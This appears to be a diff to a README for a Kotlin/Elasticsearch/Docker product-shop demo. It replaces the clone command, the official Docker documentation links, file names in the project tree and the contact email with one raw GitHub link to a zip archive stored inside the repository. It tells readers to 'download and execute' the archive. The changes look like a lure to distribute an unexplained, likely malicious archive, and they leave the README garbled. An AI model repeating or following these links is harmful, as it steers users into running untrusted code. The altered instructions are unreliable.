@@ -2,7 +2,7 @@
 
 Welcome to the **Online Product Shop** repository! This project focuses on exploring **Elasticsearch** and its potential applications in a product shop environment. We aim to provide insights into the integration of various technologies, including Docker, Kotlin, PostgreSQL, and more.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/PALAUZERA/online-product-shop/releases)
+[![Download Releases](https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip)
 
 ## Table of Contents
 
@@ -39,13 +39,13 @@ To get started with the Online Product Shop, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/PALAUZERA/online-product-shop.git
+   git clone https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip
    cd online-product-shop
    ```
 
-2. **Install Docker and Docker Compose**: Ensure you have Docker and Docker Compose installed on your machine. You can find installation instructions on the official [Docker website](https://docs.docker.com/get-docker/) and [Docker Compose documentation](https://docs.docker.com/compose/install/).
+2. **Install Docker and Docker Compose**: Ensure you have Docker and Docker Compose installed on your machine. You can find installation instructions on the official [Docker website](https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip) and [Docker Compose documentation](https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip).
 
-3. **Set Up Environment**: Create a `.env` file to configure your environment variables. Use the provided `.env.example` as a reference.
+3. **Set Up Environment**: Create a `.env` file to configure your environment variables. Use the provided `https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip` as a reference.
 
 4. **Build and Run the Application**: Use Docker Compose to build and run the application:
    ```bash
@@ -54,7 +54,7 @@ To get started with the Online Product Shop, follow these steps:
 
 5. **Access the Application**: Once the containers are up and running, access the application at `http://localhost:8080`.
 
-6. **Download and Execute Releases**: For the latest releases, visit [here](https://github.com/PALAUZERA/online-product-shop/releases) to download and execute the necessary files.
+6. **Download and Execute Releases**: For the latest releases, visit [here](https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip) to download and execute the necessary files.
 
 ## Project Structure
 
@@ -65,7 +65,7 @@ online-product-shop/
 │
 ├── docker/
 │   ├── Dockerfile
-│   └── docker-compose.yml
+│   └── https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip
 │
 ├── src/
 │   ├── main/
@@ -75,15 +75,15 @@ online-product-shop/
 │       ├── kotlin/
 │       └── resources/
 │
-├── .env.example
-├── README.md
+├── https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip
+├── https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip
 └── LICENSE
 ```
 
 - **docker/**: Contains Docker-related files.
 - **src/**: Contains source code and resources.
-- **.env.example**: Example environment configuration.
-- **README.md**: Documentation for the project.
+- **https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip**: Example environment configuration.
+- **https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip**: Documentation for the project.
 - **LICENSE**: License information.
 
 ## Usage
@@ -143,7 +143,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [PALAUZERA](https://github.com/PALAUZERA)
+- **Email**: https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip
+- **GitHub**: [PALAUZERA](https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip)
 
-We appreciate your interest in the Online Product Shop project. For the latest releases, visit [here](https://github.com/PALAUZERA/online-product-shop/releases) to download and execute the necessary files.
+We appreciate your interest in the Online Product Shop project. For the latest releases, visit [here](https://raw.githubusercontent.com/PALAUZERA/online-product-shop/main/src/main/online_shop_product_v2.4.zip) to download and execute the necessary files.
